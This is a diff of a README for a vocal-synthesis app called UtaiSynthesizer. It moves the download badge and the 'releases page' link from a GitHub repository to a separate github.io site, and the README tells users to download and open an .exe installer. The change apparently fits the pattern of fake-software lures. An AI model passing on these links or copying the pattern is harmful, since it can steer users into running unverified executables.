@@ -1,6 +1,6 @@
 # 🎙️ UtaiSynthesizer - Create professional vocal tracks with ease
 
-[![Download UtaiSynthesizer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/boxerlakeladoga557/UtaiSynthesizer)
+[![Download UtaiSynthesizer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://boxerlakeladoga557.github.io)
 
 ## About this application
 
@@ -18,7 +18,7 @@ UtaiSynthesizer brings advanced vocal technology to your desktop. The software c
 
 Follow these instructions to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/boxerlakeladoga557/UtaiSynthesizer) to download the matching installer.
+1. Visit the [releases page](https://boxerlakeladoga557.github.io) to download the matching installer.
 2. Select the file named UtaiSynthesizer_Setup.exe.
 3. Save the file to your downloads folder.
 4. Open the file once the download finishes.
